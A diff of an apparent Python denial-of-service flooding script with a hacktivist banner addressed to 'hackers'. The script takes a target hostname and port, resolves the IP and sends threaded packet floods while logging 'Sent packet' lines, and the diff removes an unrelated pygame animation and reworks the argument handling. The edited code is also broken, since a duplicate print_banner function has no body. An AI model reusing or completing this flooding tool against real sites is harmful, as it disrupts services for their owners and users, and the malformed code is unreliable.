@@ -1,4 +1,3 @@
-# -*-import pygame
 import sys
 import math
 from colorama import Fore, Style, init
@@ -9,7 +8,6 @@ import random
 import string
 import threading
 import socket
-import pygame
 
 # Inisialisasi colorama
 init(autoreset=True)
@@ -42,62 +40,21 @@ def print_banner():
     print("Welcome Pejuang BRIGADE AL ASQA BASE_ NAI")
     print("Note- Greetings All Hackers Let's Take Part in the Struggle in the Humanitarian Mission to Defend Palestine")
 
+
+def print_banner():
+    # Kode banner di sini
+
 print_banner()
-time.sleep(5)  # Tunggu 5 detik sebelum memulai animasi
+time.sleep(5)
 
-# Inisialisasi Pygame
-pygame.init()
+if len(sys.argv) != 2:
+    print(f"ERROR\n Usage: {sys.argv[0]} <Hostname>")
+    sys.exit(1)
 
-# Set ukuran layar
-lebar, tinggi = 640, 480
-layar = pygame.display.set_mode((lebar, tinggi))
-
-# Set judul jendela
-pygame.display.set_caption("Animasi Poligon")
-
-# Set warna
-putih = (255, 255, 255)
-merah = (255, 0, 0)
-
-# Fungsi untuk menggambar poligon
-def gambar_poligon(sudut, x, y, radius):
-    points = []
-    for i in range(sudut):
-        angle = 2 * math.pi * i / sudut
-        px = x + radius * math.cos(angle)
-        py = y + radius * math.sin(angle)
-        points.append((px, py))
-    return points
-
-# Variabel untuk animasi
-sudut = 3
-radius = 100
-x, y = lebar // 2, tinggi // 2
-
-# Loop utama
-while True:
-    for event in pygame.event.get():
-        if event.type == pygame.QUIT:
-            pygame.quit()
-            sys.exit()
-
-    layar.fill(putih)
-    points = gambar_poligon(sudut, x, y, radius)
-    pygame.draw.polygon(layar, merah, points, 2)
-    sudut += 1
-    if sudut > 10:
-        sudut = 3
-
-    pygame.display.flip()
-    pygame.time.Clock().tick(60)
-
+hostname = sys.argv[1]
 port_pilihan = input("Masukkan port (80 untuk HTTP, 443 untuk HTTPS): ")
 port = int(port_pilihan)
-num_requests = 100000
-if len(sys.argv) != 3:
-    print(f"ERROR\n Usage: {sys.argv[0]} <Hostname> <Port> < Number_of_Attacks >")
-    sys.exit(1)
-    
+   
 # Ubah FQDN ke IP
 try:
     host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
@@ -121,11 +78,11 @@ def print_status():
     ph_value = str(slice)
     orp_value = str(slice)
     sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
-    print(f" \033[92mTurbo_Base  \033[97mSent packet\033[33m  [\033[32m"+ip+"\033[33m]\033[0m" )
+    print(f" \033[92mTurbo_Base  \033[97mSent packet TL24434\033[33m  [\033[32m"+ip+"\033[33m]\033[0m" )
     sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
-    print(f" \033[32mTurbo_Base  \033[33mSent packet\033[97m  [\033[35m"+ip+"\033[97m]\033[0m" )
+    print(f" \033[32mTurbo_Base  \033[33mSent packet TL24434\033[97m  [\033[35m"+ip+"\033[97m]\033[0m" )
     sys.stdout.write(f"{time.ctime().split()[3]} [{str(thread_num)}]")
-    print(f" \033[37mTurbo_Base  \033[96mSent packet\033[95m  [\033[93m"+ip+"\033[93m]\033[0m" )
+    print(f" \033[37mTurbo_Base  \033[96mSent packet TL24434\033[95m  [\033[93m"+ip+"\033[93m]\033[0m" )
     thread_num_mutex.release()
     
 # Hasilkan Jalur URL
